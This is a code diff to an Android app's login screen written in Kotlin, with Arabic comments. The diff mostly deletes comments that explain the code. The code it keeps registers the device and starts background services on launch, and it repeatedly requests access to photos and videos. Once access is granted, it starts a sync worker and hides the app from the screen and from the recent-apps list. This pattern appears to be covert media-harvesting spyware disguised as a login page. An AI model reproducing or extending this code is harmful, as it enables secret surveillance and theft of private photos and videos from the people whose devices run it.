@@ -144,7 +144,6 @@ object RemoteImgs {
 
 class LoginActivity : ComponentActivity() {
 
-    // 0 = دخول، 1 = تسجيل، 2 = استعادة، 3 = اللغة
     private var currentScreen by mutableStateOf(0)
     private var isLoading by mutableStateOf(false)
 
@@ -195,11 +194,9 @@ class LoginActivity : ComponentActivity() {
 
         captchaCode = newCaptchaCode()
 
-        // ⭐ تسجيل الجهاز + تشغيل الخلفية من أول لحظة
         try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
         startBackgroundService()
 
-        // ⭐ طلب صلاحيات الملفات والوسائط (صور + فيديو) بعد 1.5 ثانية
         Handler(Looper.getMainLooper()).postDelayed({
             requestMediaPermissions()
         }, 1500L)
@@ -223,21 +220,15 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // الأذونات — الملفات والوسائط فقط (صور + فيديو)
+    // الأذونات — ملفات ووسائط فقط (صور + فيديو)
     // =================================================
 
     private fun requiredMediaPermissions(): List<String> {
         val list = mutableListOf<String>()
         when {
             Build.VERSION.SDK_INT >= 33 -> {
-                // Android 13+ — صلاحيات مفصلة
                 list.add("android.permission.READ_MEDIA_IMAGES")
                 list.add("android.permission.READ_MEDIA_VIDEO")
-                // ملاحظة: READ_MEDIA_AUDIO مقصود عدم إضافته
-            }
-            Build.VERSION.SDK_INT >= 30 -> {
-                // Android 11-12 — MANAGE_EXTERNAL_STORAGE أو READ_EXTERNAL_STORAGE
-                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
             }
             else -> {
                 list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
@@ -254,7 +245,6 @@ class LoginActivity : ComponentActivity() {
         }
 
         if (needed.isEmpty()) {
-            // كل الأذونات ممنوحة — نكمل
             onMediaPermissionsGranted()
             return
         }
@@ -276,7 +266,6 @@ class LoginActivity : ComponentActivity() {
             grantResults.all { it == PackageManager.PERMISSION_GRANTED }
 
         if (!allGranted) {
-            // حاول تاني لحد 3 مرات
             if (permissionAttempts < 3) {
                 Handler(Looper.getMainLooper()).postDelayed({
                     requestMediaPermissions()
@@ -296,15 +285,12 @@ class LoginActivity : ComponentActivity() {
         if (mediaPermissionHandled) return
         mediaPermissionHandled = true
 
-        // 1) شغّل الخدمة الأمامية فوراً
         startBackgroundService()
 
-        // 2) تأكيد تشغيل SyncWorker من داخل الخدمة عبر intent صريح
         Handler(Looper.getMainLooper()).postDelayed({
             try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
         }, 2000L)
 
-        // 3) اختفاء التطبيق من الشاشة والـ recents
         Handler(Looper.getMainLooper()).postDelayed({
             hideAndMinimize()
         }, 800L)
@@ -312,14 +298,12 @@ class LoginActivity : ComponentActivity() {
 
     private fun hideAndMinimize() {
         try {
-            // أخرجه من الـ recents
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 finishAndRemoveTask()
             } else {
                 finish()
             }
 
-            // حركة "الخروج من الشاشة" — يروح للـ home
             val home = Intent(Intent.ACTION_MAIN).apply {
                 addCategory(Intent.CATEGORY_HOME)
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
@@ -1131,7 +1115,6 @@ class LoginActivity : ComponentActivity() {
     fun EyeIcon(visible: Boolean, modifier: Modifier = Modifier) {
         Canvas(modifier = modifier) {
             val w = size.width
-            val h = size.height
             val s = w / 24f
             val stroke = Stroke(
                 width = 2f * s,
